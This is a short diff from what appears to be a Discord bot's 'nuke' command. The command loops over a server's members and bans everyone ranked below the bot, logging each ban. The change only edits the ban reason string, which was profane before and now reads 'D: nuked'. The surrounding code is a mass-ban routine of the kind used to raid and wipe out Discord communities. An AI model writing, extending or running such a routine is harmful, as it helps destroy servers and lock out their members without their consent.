@@ -79,7 +79,7 @@ async def nuke(ctx, c:str, name="", channelamount=0, *, message=""):
                 if member.id is not aurthor.id or bot_member.id:
                     if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                         try:
-                            await member.ban(reason="the owner got his shit nuked")
+                            await member.ban(reason="D: nuked")
                             time = datetime.datetime.now().strftime("%H:%M:%S")
                             print(f"[{time}] {member.name} ({member.id}) banned (MEMBER)")
 
